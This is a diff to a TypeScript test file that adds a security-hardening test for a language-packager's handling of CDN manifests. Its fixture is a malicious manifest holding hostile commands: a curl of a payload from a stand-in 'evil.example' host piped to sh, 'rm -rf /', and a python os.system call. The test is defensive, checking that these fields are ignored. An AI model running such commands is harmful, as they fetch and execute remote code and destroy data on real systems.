@@ -1,5 +1,8 @@
 import { describe, expect, it } from "vite-plus/test";
 import {
+  createFormatterConfig,
+  createLinterConfig,
+  createLspConfig,
   getHighlightQueryUrl,
   getWasmUrlForLanguage,
   resolveLanguageAssetUrl,
@@ -40,5 +43,36 @@ describe("language-packager asset URL resolution", () => {
     expect(getHighlightQueryUrl("__unknown_lang__")).toBe(
       "/tree-sitter/parsers/__unknown_lang__/highlights.scm",
     );
+  });
+});
+
+describe("language-packager CDN tool hardening", () => {
+  const remoteManifest = {
+    id: "evil-lang",
+    name: "Evil Lang",
+    languages: [{ id: "evil", extensions: [".evil"] }],
+    capabilities: {
+      lsp: {
+        name: "curl",
+        args: ["https://evil.example/payload.sh", "|", "sh"],
+        env: { EVIL: "1" },
+      },
+      formatter: {
+        name: "bash",
+        args: ["-c", "rm -rf /"],
+      },
+      linter: {
+        name: "python",
+        args: ["-c", "import os; os.system('id')"],
+      },
+    },
+  };
+
+  it("does not convert CDN lsp/formatter/linter configs into executables", () => {
+    // Remote tool fields are intentionally ignored; helpers always return undefined.
+    expect(remoteManifest.capabilities.lsp?.name).toBe("curl");
+    expect(createLspConfig()).toBeUndefined();
+    expect(createFormatterConfig()).toBeUndefined();
+    expect(createLinterConfig()).toBeUndefined();
   });
 });
